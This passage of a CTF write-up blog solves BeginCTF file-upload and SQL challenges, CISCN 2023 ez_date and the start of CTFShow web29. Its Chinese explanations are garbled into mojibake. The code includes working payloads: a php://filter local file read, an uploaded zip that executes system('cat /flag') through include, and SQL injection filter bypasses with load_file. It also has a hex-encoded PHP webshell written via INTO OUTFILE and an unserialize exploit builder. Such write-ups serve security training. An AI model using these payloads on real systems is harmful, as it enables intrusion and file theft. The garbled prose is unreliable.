class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$file_name</span>);<br><span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>[<span class="hljs-number">1</span>]);<br><br><span class="hljs-variable">$allowed</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;zip&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$allowed</span>)) &#123;<br></code></pre></td></tr></table></figure><p>è¿™é¢˜æˆ‘è¿˜æ˜¯ç”¨çš„ä¼ªåè®®ç›´æ¥æŠŠ<code>/flag</code>è¯»å‡ºæ¥äº†ã€‚ã€‚ğŸ˜‚éé¢„æœŸäº†åº”è¯¥ï¼Œä¸è¿‡æ‡’å¾—æ£é¼“å…¶å®ƒæ–¹æ³•äº†</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?action=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=/flag<br></code></pre></td></tr></table></figure><p>flag:</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">begin</span>&#123;s7rAnG3_5UFFIx_09f574e40d16&#125;<br></code></pre></td></tr></table></figure><h2 id="BeginCTF-zupload-pro-plus-max"><a href="#BeginCTF-zupload-pro-plus-max" class="headerlink" title="[BeginCTF]zupload-pro-plus-max"></a>[BeginCTF]zupload-pro-plus-max</h2><p><code>index.php:</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;GET&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>])) &#123;<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: /?action=upload&#x27;</span>);<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;/&#x27;</span> || <span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>], <span class="hljs-string">&#x27;/&#x27;</span>) &gt; <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;&lt;h1&gt;Invalid action&lt;/h1&gt;&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>]));<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$file_tmp</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$file_size</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>];<br>    <span class="hljs-variable">$file_error</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;error&#x27;</span>];<br>    <br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$file_name</span>);<br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$file_ext</span>));<br>    <br>    <span class="hljs-variable">$allowed</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;zip&#x27;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$allowed</span>) &amp;&amp; (<span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>())-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$file_tmp</span>) === <span class="hljs-literal">true</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file_error</span> === <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file_size</span> &lt;= <span class="hljs-number">2097152</span>) &#123;<br>                <span class="hljs-variable">$file_destination</span> = <span class="hljs-string">&#x27;uploads/&#x27;</span> . <span class="hljs-variable">$file_name</span>;<br>    <br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$file_tmp</span>, <span class="hljs-variable">$file_destination</span>)) &#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<br>                        <span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;ok&#x27;</span>,<br>                        <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;File uploaded successfully&#x27;</span>,<br>                        <span class="hljs-string">&#x27;url&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">preg_split</span>(<span class="hljs-string">&#x27;/\?/&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>])[<span class="hljs-number">0</span>] . <span class="hljs-variable">$file_destination</span><br>                    ));<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;error&#x27;</span>,<br>            <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;Only zip files are allowed&#x27;</span><br>        ));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™å›å¯¹<code>$_GET[&#39;action&#39;]</code>é™åˆ¶çš„æ›´å¤šäº†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;/&#x27;</span> || <span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>], <span class="hljs-string">&#x27;/&#x27;</span>) &gt; <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;&lt;h1&gt;Invalid action&lt;/h1&gt;&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>]));<br></code></pre></td></tr></table></figure><p>å€¼å¾—æ³¨æ„çš„æ˜¯è¿™å›ç”¨äº†<code>include</code>æ–¹æ³•å»åŒ…å«<code>$_GET[&#39;action&#39;]</code>ï¼Œ<code>include</code>è¿™ä¸œè¥¿ä¸åœ¨æ„æ–‡ä»¶åç¼€æ˜¯å•¥éƒ½å½“æˆphpè¿è¡Œï¼Œæ‰€ä»¥ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//echo4.phpï¼Œç„¶åå‹ç¼©æˆecho4.zip</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>););<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æŠ“åŒ…å¯ä»¥çœ‹åˆ°å³ä½¿æ˜¯å‹ç¼©æ–‡ä»¶ï¼Œè¿˜æ˜¯å­˜åœ¨<code>&lt;?php eval(system(&#39;cat /flag&#39;));?&gt;</code>ï¼š</p><p><img src="/img/zuploadproplusmax.png" alt="zuploadproplusmax"></p><p>ç„¶åç›´æ¥è®¿é—®å¯¹åº”è·¯å¾„å°±å¥½ï¼š</p><p><code>flag:begin&#123;evi1_Z1p_7d796747b39e&#125;</code></p><h2 id="BeginCTF-sqlæ•™å­¦å±€"><a href="#BeginCTF-sqlæ•™å­¦å±€" class="headerlink" title="[BeginCTF]sqlæ•™å­¦å±€"></a>[BeginCTF]sqlæ•™å­¦å±€</h2><p>flagè¢«åˆ†æˆäº†ä¸‰ä»½</p><p>è¿‡æ»¤äº†ç©ºæ ¼ï¼Œ<code>/**/</code>ç»•è¿‡ã€‚<code>select,orï¼Œfromï¼Œload</code>è¿™ç§ç›´æ¥åŒå†™ç»•è¿‡ï¼Œè¿‡æ»¤äº†<code>=</code>å¯ä»¥ç”¨<code>like</code>ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sql">ç¬¬ä¸€éƒ¨åˆ†<br><span class="hljs-number">1</span><span class="hljs-string">&#x27;union/**/sselectelect/**/group_concat(column_name)/**/ffromrom/**/infoorrmation_schema.columns/**/where/**/table_name/**/like/**/&#x27;</span>passwoorrd<span class="hljs-string">&#x27;#</span><br><span class="hljs-string"></span><br><span class="hljs-string">ç»“æœï¼šflag,id,note</span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span>sselectelect<span class="hljs-comment">/**/</span>flag<span class="hljs-comment">/**/</span>ffromrom<span class="hljs-comment">/**/</span>secret.passwoorrd#<br><br>ç»“æœï¼šflag&#123;<span class="hljs-number">795</span>b3b52<span class="hljs-operator">-</span><br><br>ç¬¬äºŒéƒ¨åˆ†ï¼š<br><span class="hljs-number">1</span><span class="hljs-string">&#x27;union/**/sselectelect/**/group_concat(column_name)/**/ffromrom/**/infoorrmation_schema.columns/**/where/**/table_name/**/like/**/&#x27;</span>scoorre<span class="hljs-string">&#x27;#</span><br><span class="hljs-string"></span><br><span class="hljs-string">ç»“æœï¼šgrade,student</span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span>sselectelect<span class="hljs-comment">/**/</span>grade<span class="hljs-comment">/**/</span>ffromrom<span class="hljs-comment">/**/</span>scoorre<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>student<span class="hljs-comment">/**/</span><span class="hljs-keyword">like</span><span class="hljs-comment">/**/</span><span class="hljs-string">&#x27;begin&#x27;</span>#<br><br>ç»“æœï¼šae48<span class="hljs-number">-4851</span><span class="hljs-operator">-</span>be79<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸‰éƒ¨åˆ†æç¤º<code>flag</code>åœ¨<code>/flag</code>ä¸‹ï¼Œä¸€å¼€å§‹ä»¥ä¸ºè¦å†™ä¸ªé©¬è¿›å»ï¼Œè¯•äº†è¯•å‘ç°æƒé™ä¸å¤Ÿï¼Œload_fileç›´æ¥è¯»å°±è¡Œï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;/**/UNION/**/ALL/**/SselectELECT/**/lloadOAD_FILE(&#x27;</span><span class="hljs-operator">/</span>flag<span class="hljs-string">&#x27;)#</span><br><span class="hljs-string">ç»“æœï¼š-d84e543816e6&#125;</span><br></code></pre></td></tr></table></figure><p>é¡ºä¾¿è®°å½•ä¸‹å¦‚æœè¯»å†™æƒé™å¤Ÿçš„è¯ï¼Œå¯ä»¥è¿™ä¹ˆå†™ä¸œè¥¿è¿›ç‰¹å®šæ–‡ä»¶é‡Œï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;/**/UNION/**/SselectELECT/**/0x3c3f706870206576616c28245f504f53545b2774657374275d293f3e/**/INTO/**/OUTFILE/**/&quot;/var/www/html/hello.php&quot;#</span><br></code></pre></td></tr></table></figure><h2 id="CISCN-2023-ååŒ—-ez-date"><a href="#CISCN-2023-ååŒ—-ez-date" class="headerlink" title="[CISCN 2023 ååŒ—]ez_date"></a>[CISCN 2023 ååŒ—]ez_date</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">date</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;a)||<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;b))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;no array&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;a !== <span class="hljs-variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;a) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;b)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;a)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;b)) )&#123;<br>            <span class="hljs-variable">$content</span>=<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-variable">$uuid</span>=<span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-string">&#x27;.txt&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$uuid</span>,<span class="hljs-variable">$content</span>);<br>            <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uuid</span>));<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$data</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>])); <br></code></pre></td></tr></table></figure><p>classç±»ä¸­å­˜åœ¨<code>__wakeup</code>æ–¹æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;a)||<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;b))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;no array&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;a !== <span class="hljs-variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;a) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;b)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;a)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;b)) )<br></code></pre></td></tr></table></figure><p>é™åˆ¶<code>a</code>å’Œ<code>b</code>ä¸èƒ½ä¸ºæ•°ç»„ï¼Œç„¶åå°±æ˜¯æ¯”è¾ƒç»å…¸çš„å¼ºç­‰äºã€‚é™åˆ¶äº†æ•°ç»„çš„è¯å¯ä»¥ç”¨ç¢°æ’è§£é¢˜ï¼Œä½†åé¢è¿˜è¿ç€ä¸€ä¸ª<code>sha1</code>&#x3D;&#x3D;&#x3D;<code>sha1</code></p><p>å¼ºç­‰äºé™¤äº†æ•°ç»„å¤–å­˜åœ¨å¦‚ä¸‹æ–¹æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-number">12</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-string">&#x27;12&#x27;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> == <span class="hljs-variable">$b</span> &amp;&amp;<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-number">12</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&#x27;12&#x27;</span>))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;ok&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;no no no~&#x27;</span>;<br>&#125;<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-comment">//ç»“æœï¼š</span><br>ok<br><span class="hljs-keyword">string</span>(<span class="hljs-number">40</span>) <span class="hljs-string">&quot;7b52009b64fd0a2a49e6d8a939753077792b0554&quot;</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">40</span>) <span class="hljs-string">&quot;7b52009b64fd0a2a49e6d8a939753077792b0554&quot;</span><br></code></pre></td></tr></table></figure><p>ç„¶åå¯¹<code>file</code>å˜é‡è°ƒç”¨äº†<code>date</code>å‡½æ•°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$content</span>=<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-variable">$this</span>-&gt;file);<br></code></pre></td></tr></table></figure><p>è¿™ä¸œè¥¿å¯ä»¥ç”¨æ¥è½¬ä¹‰ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;/flag&quot;</span>);<br><span class="hljs-keyword">echo</span><span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;/f\l\a\g&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//ç»“æœ:</span><br>/fSundayam9<br>/flag<br></code></pre></td></tr></table></figure><p>ç„¶åæ˜¯å¯¹ç»è¿‡<code>date</code>å‡½æ•°è½¬ä¹‰åæ•°æ®çš„å¤„ç†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">            <span class="hljs-variable">$uuid</span>=<span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-string">&#x27;.txt&#x27;</span>;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$uuid</span>,<span class="hljs-variable">$content</span>);<br>            <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uuid</span>));<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$data</span>);<br></code></pre></td></tr></table></figure><p>å…ˆåˆ©ç”¨<code>file_put_contents</code>å‡½æ•°æŠŠ<code>$content</code>æ”¾åˆ°ç”Ÿæˆçš„<code>$uuid</code>æ–‡ä»¶ä¸­ï¼Œç„¶ååˆ©ç”¨æ­£åˆ™åŒ¹é…å°†æ–‡ä»¶ä¸­çš„ç©ºç™½å­—ç¬¦å’Œæ¢è¡Œæ›¿æ¢ä¸ºç©ºå­—ç¬¦ï¼Œå†èµ‹å€¼ç»™<code>$data</code>ã€‚æœ€ååˆ©ç”¨<code>file_get_contents</code>å’Œ<code>echo</code>é…åˆè¾“å‡ºã€‚</p><p>æ‰€ä»¥æ„é€ <code>payload</code>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">date</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span> = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;1&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;/f\l\a\g&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">date</span>();<br><span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$c</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$d</span>);<br></code></pre></td></tr></table></figure><p>æœ€åæ˜¯è¿™å‡ ä¸ª<code>file_get_contents</code>å’Œ<code>file_get_contenes</code>çš„ç»„åˆä½¿ç”¨ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$content</span>=<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-variable">$uuid</span>=<span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-string">&#x27;.txt&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$uuid</span>,<span class="hljs-variable">$content</span>);<br>            <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uuid</span>));<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$data</span>);<br></code></pre></td></tr></table></figure><p>é¦–å…ˆ<code>$content</code>æˆäº†<code>/flag</code>ï¼Œç„¶åfile_put_contentsæŠŠ&#x2F;<code>flag</code>è¿™ä¸ªå­—ç¬¦ä¸²å†™åˆ°ç›®æ ‡æ–‡ä»¶é‡Œï¼Œç„¶å<code>file_get_contents($uuid)</code>è¿™ä¸œè¥¿æŠŠæ–‡ä»¶å†…å®¹èµ‹å€¼ç»™<code>$data</code>ï¼Œè¿™æ—¶<code>$data</code>æˆäº†<code>/flag</code>ã€‚æœ€åå†åˆ©ç”¨ä¸€ä¸ª<code>file_get_contents</code>å»è¯»<code>/flag</code>çš„å†…å®¹ã€‚</p><h2 id="CTFShowå‘½ä»¤æ‰§è¡Œ-web29-39"><a href="#CTFShowå‘½ä»¤æ‰§è¡Œ-web29-39" class="headerlink" title="[CTFShowå‘½ä»¤æ‰§è¡Œ]web29-39"></a>[CTFShowå‘½ä»¤æ‰§è¡Œ]web29-39</h2><h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span 